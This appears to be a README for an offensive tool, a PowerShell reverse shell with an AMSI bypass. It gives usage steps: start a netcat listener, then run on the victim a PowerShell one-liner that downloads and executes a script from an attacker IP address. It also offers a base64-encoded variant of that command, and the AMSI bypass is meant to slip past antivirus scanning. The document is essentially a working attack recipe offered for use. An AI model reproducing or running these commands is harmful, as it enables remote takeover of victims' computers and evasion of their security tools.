# Name
Simple PS Reverse Shell with AMSI Bypass

## Usage
```
Change Line 1 in runall.ps1 to Kali's IP

Change IP and port in simple_ps_revshell.ps1 to attacker's IP and port

Start nc listener
    nc -lvp 443

In victim's cmd shell
    powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')

OR encoded powershell command
    IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1') save to to_encode.txt 
    python b64_encode.py to_encode.txt 
    powershell -e <b64 payload>
```

## Source
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
